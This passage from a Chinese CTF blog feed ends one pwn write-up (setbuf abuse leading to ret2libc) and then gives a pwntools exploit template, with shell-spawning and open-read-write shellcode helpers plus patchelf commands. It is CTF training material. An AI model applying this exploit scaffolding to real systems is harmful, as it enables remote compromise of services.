title="总结"></a>总结</h1><p>总的来说还是一道不错的题目，不是常规的ret2libc题目，但还是挺简单的。该题先通过数组越界调用setbuf函数，再利用setbuf函数将输入输出流和缓冲区数据同步，多次写入打栈溢出从而打ret2libc。</p>]]></content>
      
      
      <categories>
          
          <category> pwn题目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf_pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn_小记</title>
      <link href="/2025/12/03/pwn-%E5%B0%8F%E8%AE%B0/"/>
      <url>/2025/12/03/pwn-%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>本文章会持续更新，用于记录pwn过程中，本人觉得值得记录的东西0v0</p><h1 id="pwn的exp简化模板"><a href="#pwn的exp简化模板" class="headerlink" title="pwn的exp简化模板"></a>pwn的exp简化模板</h1><p>该部分记录使用lambda表达式与自定义函数简化exp，便于未来exp的编写。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;&#x27;</span><br><span class="line">libc_file=&#x27;&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=1</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;&#x27;</span><br><span class="line">    port=</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">#连接</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><p>其中需要注意的是，如果设置terminal为tmux时gdb，需要在tmux下运行exp，且tmux的操作一般先是先输入CTRL+b，再接着输入命令。</p><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>在做pwn题的过程中，有时候本地调试的环境会和远程不一样，从而导致本地通了而远程没通的情况，此时可以使用patchelf或者docker解决相应问题。因为patchelf比较简单，在这里先记录该方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings ./libc-x.xx | grep ubuntu    //查看版本</span><br><span class="line">./download xxxx    //在glibc-all-in-one中下载相应版本</span><br><span class="line">patchelf --set-interpreter 文件夹名/ld.so ./pwn    //换掉ld</span><br><span class="line">patchelf --set-rpath 文件夹名 ./pwn    //换掉path</span><br></pre></td></tr></table></figure><p>这样一来就patch好了。当然这种方法不是万能的，有些难题对环境的要求很高，因此后续会记录docker的方法，只要知道了远程的环境，我们就能使用docker部署一个一样的环境在本地调试。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
